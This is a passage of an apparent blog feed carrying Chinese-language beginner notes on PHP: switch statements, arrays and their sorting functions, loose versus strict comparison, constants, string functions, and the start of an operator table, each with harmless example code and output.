class="php">    如果 n 既不等于 label1 也不等于 label2，此处代码将执行;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>例如<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$favcolor=<span class="string">"red"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">switch</span> ($favcolor)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">case</span> <span class="string">"red"</span>:</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"你喜欢的颜色是红色!"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">break</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">case</span> <span class="string">"blue"</span>:</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"你喜欢的颜色是蓝色!"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">break</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">case</span> <span class="string">"green"</span>:</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"你喜欢的颜色是绿色!"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">break</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">default</span>:</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"你喜欢的颜色不是 红, 蓝, 或绿色!"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>首先对一个简单的表达式 n（通常是变量）进行一次计算。将表达式的值与结构中每个 case 的值进行比较。如果存在匹配，则执行与 case 关联的代码。代码执行后，使用 break 来阻止代码跳入下一个 case 中继续执行。default 语句用于不存在匹配（即没有 case 为真）时执行</p><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>数组能够在单个变量中存储多个值<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$cars=<span class="keyword">array</span>(<span class="string">"Volvo"</span>,<span class="string">"BMW"</span>,<span class="string">"Toyota"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"I like "</span> . $cars[<span class="number">0</span>] . <span class="string">", "</span> . $cars[<span class="number">1</span>] . <span class="string">" and "</span> . $cars[<span class="number">2</span>] . <span class="string">"."</span>;</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I like Volvo, <span class="keyword">BMW </span><span class="keyword">and </span>Toyota.</span><br></pre></td></tr></table></figure><br>数组就是为了方便遍历数据的产物<br><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$cars</span>1=<span class="string">"Volvo"</span>;</span><br><span class="line"><span class="symbol">$cars</span>2=<span class="string">"BMW"</span>;</span><br><span class="line"><span class="symbol">$cars</span>3=<span class="string">"Toyota"</span>;</span><br></pre></td></tr></table></figure><br>例如这样存储数据，那么在定义和调用的时候就会比较麻烦</p><h2 id="创建数组"><a href="#创建数组" class="headerlink" title="创建数组"></a>创建数组</h2><p>在PHP中使用<code>array()</code>函数创建数组</p><p>数组有三种类型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">数值数组 -带有数字ID键的数组</span><br><span class="line"></span><br><span class="line">关联数组 -带有指定的键的数组，每个键关联一个值</span><br><span class="line"></span><br><span class="line">多维数组 -包含一个或多个数组的数组</span><br></pre></td></tr></table></figure></p><h3 id="count函数"><a href="#count函数" class="headerlink" title="count函数"></a>count函数</h3><p>count函数用于返回数组的长度<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$cars=<span class="keyword">array</span>(<span class="string">"Volvo"</span>,<span class="string">"BMW"</span>,<span class="string">"Toyota"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> count($cars);</span></span><br></pre></td></tr></table></figure><br>运行结果为3</p><h3 id="数值数组"><a href="#数值数组" class="headerlink" title="数值数组"></a>数值数组</h3><p>自动分配ID键，总是从0开始<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cars=<span class="built_in">array</span>(<span class="string">"Volvo"</span>,<span class="string">"BMW"</span>,<span class="string">"Toyota"</span>);</span><br></pre></td></tr></table></figure><br>还可以人工分配，也就是指定下标内容<br><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$cars</span>[<span class="number">0</span>]=<span class="string">"Volvo"</span>;</span><br><span class="line"><span class="symbol">$cars</span>[<span class="number">1</span>]=<span class="string">"BMW"</span>;</span><br><span class="line"><span class="symbol">$cars</span>[<span class="number">2</span>]=<span class="string">"Toyota"</span>;</span><br></pre></td></tr></table></figure></p><h4 id="遍历数值数组"><a href="#遍历数值数组" class="headerlink" title="遍历数值数组"></a>遍历数值数组</h4><p>遍历数组一般用循环语句<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$cars=<span class="keyword">array</span>(<span class="string">"Volvo"</span>,<span class="string">"BMW"</span>,<span class="string">"Toyota"</span>);</span></span><br><span class="line"><span class="php">$arrlength=count($cars);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">for</span>($x=<span class="number">0</span>;$x&lt;$arrlength;$x++)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $cars[$x];</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Volvo</span></span><br><span class="line"><span class="keyword">BMW</span></span><br><span class="line"><span class="keyword">Toyota</span></span><br></pre></td></tr></table></figure></p><h3 id="关联数组"><a href="#关联数组" class="headerlink" title="关联数组"></a>关联数组</h3><p>这里有两种关联数组的方式<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$age=<span class="keyword">array</span>(<span class="string">"Peter"</span>=&gt;<span class="string">"35"</span>,<span class="string">"Ben"</span>=&gt;<span class="string">"37"</span>,<span class="string">"Joe"</span>=&gt;<span class="string">"43"</span>);</span><br></pre></td></tr></table></figure><br>OR<br><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$age</span>[<span class="string">'Peter'</span>]=<span class="string">"35"</span>;</span><br><span class="line"><span class="symbol">$age</span>[<span class="string">'Ben'</span>]=<span class="string">"37"</span>;</span><br><span class="line"><span class="symbol">$age</span>[<span class="string">'Joe'</span>]=<span class="string">"43"</span>;</span><br></pre></td></tr></table></figure></p><p>例如<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$age=<span class="keyword">array</span>(<span class="string">"Peter"</span>=&gt;<span class="string">"35"</span>,<span class="string">"Ben"</span>=&gt;<span class="string">"37"</span>,<span class="string">"Joe"</span>=&gt;<span class="string">"43"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"Peter is "</span> . $age[<span class="string">'Peter'</span>] . <span class="string">" years old."</span>;</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Peter <span class="keyword">is</span> <span class="number">35</span> years old.</span><br></pre></td></tr></table></figure></p><h4 id="遍历关联数组"><a href="#遍历关联数组" class="headerlink" title="遍历关联数组"></a>遍历关联数组</h4><p>打印关联数组中的所有值可以用foreach循环<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$age=<span class="keyword">array</span>(<span class="string">"Peter"</span>=&gt;<span class="string">"35"</span>,<span class="string">"Ben"</span>=&gt;<span class="string">"37"</span>,<span class="string">"Joe"</span>=&gt;<span class="string">"43"</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">foreach</span>($age <span class="keyword">as</span> $x=&gt;$x_value)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Key="</span> . $x . <span class="string">", Value="</span> . $x_value;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Key</span>=Peter, <span class="attribute">Value</span>=35</span><br><span class="line"><span class="attribute">Key</span>=Ben, <span class="attribute">Value</span>=37</span><br><span class="line"><span class="attribute">Key</span>=Joe, <span class="attribute">Value</span>=43</span><br></pre></td></tr></table></figure></p><h2 id="数组排序"><a href="#数组排序" class="headerlink" title="数组排序"></a>数组排序</h2><p>按字母或者数字顺序降序或升序排列</p><h3 id="排列函数"><a href="#排列函数" class="headerlink" title="排列函数"></a>排列函数</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">sort</span><span class="params">()</span></span> - 对数组进行升序排列</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">rsort</span><span class="params">()</span></span> - 对数组进行降序排列</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">asort</span><span class="params">()</span></span> - 根据关联数组的值，对数组进行升序排列</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">ksort</span><span class="params">()</span></span> - 根据关联数组的键，对数组进行升序排列</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">arsort</span><span class="params">()</span></span> - 根据关联数组的值，对数组进行降序排列</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">krsort</span><span class="params">()</span></span> - 根据关联数组的键，对数组进行降序排列</span><br></pre></td></tr></table></figure><h4 id="sort-对数组升序排列"><a href="#sort-对数组升序排列" class="headerlink" title="sort -对数组升序排列"></a>sort -对数组升序排列</h4><p>按照字母顺序升序排列<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$cars=<span class="keyword">array</span>(<span class="string">"Volvo"</span>,<span class="string">"BMW"</span>,<span class="string">"Toyota"</span>);</span></span><br><span class="line"><span class="php">sort($cars);</span></span><br><span class="line"><span class="php">print_r($cars);</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; BMW</span><br><span class="line">    [<span class="number">1</span>] =&gt; Toyota</span><br><span class="line">    [<span class="number">2</span>] =&gt; Volvo</span><br><span class="line">)</span><br></pre></td></tr></table></figure><br>按照数字排列<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$numbers=<span class="built_in">array</span>(<span class="number">4</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">22</span>,<span class="number">11</span>);</span><br><span class="line">sort($numbers);</span><br><span class="line">print_r($numbers);</span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">4</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">6</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="number">11</span></span><br><span class="line">    [<span class="number">4</span>] =&gt; <span class="number">22</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><h4 id="rsort-对数组降序排列"><a href="#rsort-对数组降序排列" class="headerlink" title="rsort() -对数组降序排列"></a>rsort() -对数组降序排列</h4><p>按字母排列<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$cars=<span class="keyword">array</span>(<span class="string">"Volvo"</span>,<span class="string">"BMW"</span>,<span class="string">"Toyota"</span>);</span></span><br><span class="line"><span class="php">rsort($cars);</span></span><br><span class="line"><span class="php">print_r($cars);</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; Volvo</span><br><span class="line">    [<span class="number">1</span>] =&gt; Toyota</span><br><span class="line">    [<span class="number">2</span>] =&gt; BMW</span><br><span class="line">)</span><br></pre></td></tr></table></figure><br>按字母排列类似</p><h4 id="asort-根据数组的值升序排列"><a href="#asort-根据数组的值升序排列" class="headerlink" title="asort -根据数组的值升序排列"></a>asort -根据数组的值升序排列</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$age=<span class="keyword">array</span>(<span class="string">"Peter"</span>=&gt;<span class="string">"35"</span>,<span class="string">"Ben"</span>=&gt;<span class="string">"37"</span>,<span class="string">"Joe"</span>=&gt;<span class="string">"43"</span>);</span></span><br><span class="line"><span class="php">asort($age);</span></span><br><span class="line"><span class="php">print_r($age);</span></span><br></pre></td></tr></table></figure><p>运行结果<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [Peter] =&gt; <span class="number">35</span></span><br><span class="line">    [Ben] =&gt; <span class="number">37</span></span><br><span class="line">    [Joe] =&gt; <span class="number">43</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>降序排列为arsort()</p><h4 id="ksort-根据数组的键升序排列"><a href="#ksort-根据数组的键升序排列" class="headerlink" title="ksort() -根据数组的键升序排列"></a>ksort() -根据数组的键升序排列</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$age=<span class="keyword">array</span>(<span class="string">"Peter"</span>=&gt;<span class="string">"35"</span>,<span class="string">"Ben"</span>=&gt;<span class="string">"37"</span>,<span class="string">"Joe"</span>=&gt;<span class="string">"43"</span>);</span></span><br><span class="line"><span class="php">ksort($age);</span></span><br><span class="line"><span class="php">print_r($age);</span></span><br></pre></td></tr></table></figure><p>运行结果<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [Ben] =&gt; <span class="number">37</span></span><br><span class="line">    [Joe] =&gt; <span class="number">43</span></span><br><span class="line">    [Peter] =&gt; <span class="number">35</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>降序排列为krsort()</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.PHP的判断语句与C语言很类似，在只有一句代码而不是代码块时，可以省略<code>{}</code></p><p>2.PHP的数组创建使用的是array()函数,而不是使用<code>[]</code></p><p>3.PHP中的数值数组其实ID键就是所说的下标，而关联数组类似于python中的键值对</p><p>4.数组的排列函数升序是sort，逆序就在sort前加一个r</p><p>5.遍历关联数组需要使用foreach语句，foreach 仅能够应用于数组和对象，在后面的循环中会讲到</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;条件语句&quot;&gt;&lt;a href=&quot;#条件语句&quot; class=&quot;headerlink&quot; title=&quot;条件语句&quot;&gt;&lt;/a&gt;条件语句&lt;/h1&gt;&lt;p&gt;在编写代码的时候常常需要为不同判断执行不同的动作&lt;br&gt;&lt;figure class=&quot;highlight gams&quot;&gt;&lt;ta
      
    
    </summary>
    
    
      <category term="日常学习" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="PHP" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/PHP/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PHP-2020/6/7-周报1</title>
    <link href="http://yoursite.com/2020/06/07/PHP-2020-6-7-%E5%91%A8%E6%8A%A51/"/>
    <id>http://yoursite.com/2020/06/07/PHP-2020-6-7-%E5%91%A8%E6%8A%A51/</id>
    <published>2020-06-07T00:55:32.000Z</published>
    <updated>2020-06-07T02:14:42.408Z</updated>
    
    <content type="html"><![CDATA[<h1 id="类型比较"><a href="#类型比较" class="headerlink" title="类型比较"></a>类型比较</h1><p>虽然PHP是弱类型语言，但是对于变量的比较还是有一些不同</p><p>松散比较：使用<code>==</code>比较，只比较值，不比较类型</p><p>严格比较：使用<code>===</code>比较，除了比较值，也比较类型</p><p>例如<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php">$x=<span class="string">"25"</span>;</span></span><br><span class="line"><span class="php">$y=<span class="number">25</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">var_dump($x);</span></span><br><span class="line"><span class="php">var_dump($y);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($x==$y)&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"True\n"</span>;</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"False\n"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($x===$y)&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"True\n"</span>;</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"False\n"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>运行结果：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">string</span><span class="params">(<span class="number">2</span>)</span></span> <span class="string">"25"</span></span><br><span class="line"><span class="function"><span class="title">int</span><span class="params">(<span class="number">25</span>)</span></span></span><br><span class="line">True</span><br><span class="line">False</span><br></pre></td></tr></table></figure><br>可以看到$x是”25”是一个字符串，而$y是一个整型</p><p>但是在使用==时会判等，因为只比较了值而没有比较类型</p><p><img src="/img/PHP/周报1-0.png" alt="avatar"><br><img src="/img/PHP/周报1-1.png" alt="avatar"></p><h1 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h1><p>PHP5中增加了一条规则：常量被定义后，在脚本的其他任何地方都不能改变</p><p>常量是一个简单的标识符，该值在脚本中不能被改变</p><h2 id="设置常量"><a href="#设置常量" class="headerlink" title="设置常量"></a>设置常量</h2><p>设置常量使用define()函数<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool <span class="class"><span class="keyword">define</span> </span>( <span class="built_in">string</span> $name , mixed $value <span class="meta">[</span>, bool $case_insensitive = <span class="literal">false</span> <span class="meta">]</span> )</span><br></pre></td></tr></table></figure><br>有三个参数：<br>name:必选参数，常量名称，即标识符</p><p>value:必选参数，常量的值</p><p>case_insensitive:可选参数，如果设置为True，该常量则大小写不敏感。默认时大小写敏感的</p><p>例如：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// 区分大小写的常量名</span></span></span><br><span class="line"><span class="php">define(<span class="string">"GREETING"</span>, <span class="string">"欢迎访问 Runoob.com"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> GREETING;    <span class="comment">// 输出 "欢迎访问 Runoob.com"</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> greeting;   <span class="comment">// 输出 "greeting"</span></span></span><br></pre></td></tr></table></figure></p><p>不区分大小写：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// 不区分大小写的常量名</span></span></span><br><span class="line"><span class="php">define(<span class="string">"GREETING"</span>, <span class="string">"欢迎访问 Runoob.com"</span>, <span class="keyword">true</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> greeting;  <span class="comment">// 输出 "欢迎访问 Runoob.com"</span></span></span><br></pre></td></tr></table></figure><br>常量是全局的，常量在定义之后，默认是全局变量，可以在任意地方使用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">define(<span class="string">"GREETING"</span>, <span class="string">"欢迎访问 Runoob.com"</span>);</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> GREETING;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">myTest();    <span class="comment">// 输出 "欢迎访问 Runoob.com"</span></span></span><br></pre></td></tr></table></figure><h1 id="字符串变量"><a href="#字符串变量" class="headerlink" title="字符串变量"></a>字符串变量</h1><p>字符串变量用于存储并处理文本</p><p>字符串变量用于包含有字符的值，在创建字符串之后，就可以进行操作了</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$txt=<span class="string">"Hello world!"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $txt;</span></span><br></pre></td></tr></table></figure><p>运行结果就是$txt中的值</p><p>PHP7的版本中，不再区分单引号和双引号，使用哪一个都可以定义字符串变量</p><h2 id="并置运算符"><a href="#并置运算符" class="headerlink" title="并置运算符"></a>并置运算符</h2><p>PHP中只有一个字符串运算符，就是<code>.</code>用于把两个字符串值连接起来</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$txt1=<span class="string">"Hello world!"</span>;</span></span><br><span class="line"><span class="php">$txt2=<span class="string">"What a nice day!"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $txt1 . <span class="string">" "</span> . $txt2;</span></span><br></pre></td></tr></table></figure><p>运行结果：<br><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello world! What a nice day!</span><br></pre></td></tr></table></figure></p><h2 id="strlen-函数"><a href="#strlen-函数" class="headerlink" title="strlen()函数"></a>strlen()函数</h2><p>看函数名字基本上就知道是返回字符串长度的函数<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> strlen(<span class="string">"Hello world!"</span>);</span></span><br></pre></td></tr></table></figure><br>运行结果就是12</p><p>该函数常常用在循环和其他函数中，因为确定字符串何时结束是很重要的</p><h2 id="strpos-函数"><a href="#strpos-函数" class="headerlink" title="strpos()函数"></a>strpos()函数</h2><p>strpos()函数用于在字符串中查找一个字符或一段指定的文本，如果字符串中找到匹配，就会返回第一个匹配的字符位置，如果没找到就返回False</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> strpos(<span class="string">"Hello world!"</span>,<span class="string">"world"</span>);</span></span><br></pre></td></tr></table></figure><p>运行结果为6</p><p>这里为什么不是7，是因为字符串中的第一个字符是以0开始而不是1</p><p>完整PHP String手册参考一下<br><a href="https://www.runoob.com/php/php-ref-string.html" target="_blank" rel="noopener">https://www.runoob.com/php/php-ref-string.html</a></p><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><h2 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h2><div class="table-container"><table><thead><tr><th>描述</th><th>引入方法</th><th>描述</th><th>实例</th><th>结果</th></tr></thead><tbody><tr><td>x + y</td><td>加</td><td>x 和 y 的和</td><td>2 + 2</td><td>4</td></tr><tr><td>x - y</td><td>减</td><td>x 和 y 的差</td><td>5 - 2</td><td>3</td></tr><tr><td>x * y</td><td>乘</td><td>x 和 y 的积</td><td>5 * 